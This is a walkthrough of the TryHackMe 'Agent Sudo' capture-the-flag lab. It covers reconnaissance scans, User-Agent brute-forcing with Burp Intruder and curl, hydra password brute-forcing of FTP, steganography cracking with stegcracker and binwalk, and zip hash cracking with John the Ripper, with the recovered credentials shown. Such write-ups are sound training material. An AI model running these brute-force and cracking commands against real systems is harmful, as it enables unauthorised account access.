<a href="https://tryhackme.com/room/agentsudoctf"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>
# Agent Sudo CTF

## nmap
```
~/CTF/tryhackme/agentsudo$ nmap -sC -sV 10.10.133.196
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 20:11 BST
Nmap scan report for 10.10.133.196
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
```

## nikto
```
~/CTF/tryhackme/agentsudo$ nikto -h 10.10.133.196
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.133.196
+ Target Hostname:    10.10.133.196
+ Target Port:        80
+ Start Time:         2020-08-04 20:11:34 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2020-08-04 20:16:48 (GMT1) (314 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
## gobuster
```
~/CTF/tryhackme/agentsudo$ gobuster dir -u 10.10.133.196 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.133.196
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/04 20:12:25 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/08/04 20:21:06 Finished
===============================================================
```
## website

On the front page of the website we have a comment on how to access the site:
```
Dear agents,

Use your own *codename* as *user-agent* to access the site.

From,
Agent R 
```
It doesn't us much but we may have a user name, possibly even the format: Agent R

User-Agent is also used in browsers to indicate what type/version of browser is being used by the client. 

If we look at the User-Agent from within the Firefox Developer Toolset, we see it is:

Image BS1

As I am getting to grips with some of the tools within Burp Suite, I decided to try the Intruder tool.

I set up the target as the THM host, using Sniper Attack Type and added the User-Agent as the changable field. Initially I changed the default setting that we saw in the developer image above with an 'R' as we already know that Agent R exists. I then set the Payload as a simple list running through the alpabet in capitals. 

Image BS2


I started the attack whichthen ran through the payload list. When I have done this before, I always look at the return lengthas this can be a good indication of a change. It highlighted two changes. One for R and one for C 

ImageBS3

If we now look at the response tab, we see that there are some additional comments.
```
HTTP/1.1 200 OK
Date: Wed, 05 Aug 2020 07:00:25 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 310
Connection: close
Content-Type: text/html; charset=UTF-8

What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```
So let is check out Agent C now and see what we get:

```
HTTP/1.1 302 Found
Date: Wed, 05 Aug 2020 07:00:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: *agent_C_attention.php*
Content-Length: 218
Connection: close
Content-Type: text/html; charset=UTF-8
```

The wording is the same as the rest but we have a .php file we can look at. So let us add that file to the browser tab and see what we get:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
So a message from Agent R to chris (more likely an indication that all names relate to Agent status: Agent C = Chris). We also have an indication that we have a poor password. So let us look at the two areas we know about - FTP and SSH.

For reference if we used the curl command on the website, it has the option to: -A, --user-agent <name> Send User-Agent <name> to server and also incase of redirects (as we see for the .php file above), we can add: -L, --location      Follow redirects.
```
curl 'http://10.10.96.58/' -A C -L
```
This will give us the same text as above for Chris, and I'm sure this could have been automated for all the agents in a bash script.


## hydra

Hydra can easily be set up for both FTP and SSH brute forcing. In this case I tried FTP first and within a few minutes had a username and password set.
```

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.96.58
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-05 08:21:21
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.96.58:21/
[21][ftp] host: 10.10.96.58   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-05 08:22:31
```
While we look at the FTP side, I set off hydra on the SSH with chris as the username. 

With Chris and his password we gain access to a text file and two images. Let us download and investigate:
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> 
```
So the text file gives us some more details:
```
~/CTF/tryhackme/agentsudo$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

# steganography

Using image tools lets check out what we have. Checking both with binwalk

```
karti@kali-pt:~/CTF/tryhackme/agentsudo$ binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

karti@kali-pt:~/CTF/tryhackme/agentsudo$ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
With the .jpg we can look to use Stegcracker and the rockyou.txt and lets see what we get.
```
stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt 
StegCracker 2.0.8 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: Area51doro1111
Tried 441011 passwords
Your file has been written to: cute-alien.jpg.out
Area51
```
So if we cat the .out file we get a password and username!!
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We see that the cutie.png has a file hidden inside. We can extract that with a binwalk -e. What do we get?

```
~/CTF/tryhackme/agentsudo$ cd _cutie.png.extracted/
~/CTF/tryhackme/agentsudo/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt
```
If we list the files in the directory, we see the .txt file is empty!

```
~/CTF/tryhackme/agentsudo/_cutie.png.extracted$ ls -la
total 324
drwxrwx--- 1 root vboxsf   4096 Aug  5 08:37 .
drwxrwx--- 1 root vboxsf   4096 Aug  5 08:37 ..
-rwxrwx--- 1 root vboxsf 279312 Aug  5 08:37 365
-rwxrwx--- 1 root vboxsf  33973 Aug  5 08:37 365.zlib
-rwxrwx--- 1 root vboxsf    280 Aug  5 08:37 8702.zip
-rwxrwx--- 1 root vboxsf      0 Oct 29  2019 To_agentR.txt
```
So lets try to open the zip file
```
~/CTF/tryhackme/agentsudo/_cutie.png.extracted$ 7z x 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_GB.utf8,Utf16=on,HugeFiles=on,64 bits,3 CPUs AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 13:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 13:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? 
```
Looks like it is encrypted. As we don't have an answer I will be using zip2john and the rockyou.txt.

```
~/CTF/tryhackme/agentsudo/_cutie.png.extracted$ /usr/sbin/zip2john 8702.zip 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

```

This now gives us what looks like a hash so I create an 8702.hash and remove the outer edges of the file leaving me with:
```

```
Now I use JtR to crack the hash:
```
~/CTF/tryhackme/agentsudo/_cutie.png.extracted$ /usr/sbin/john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt 8702.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
karti@kali-pt:~/CTF/tryhackme/agentsudo/_cutie.png.extracted$ /usr/sbin/john --show 8702.hash
?:alien

```
I now get the hash and as it has already cracked it I use the --show to view passwords stopred for that file.
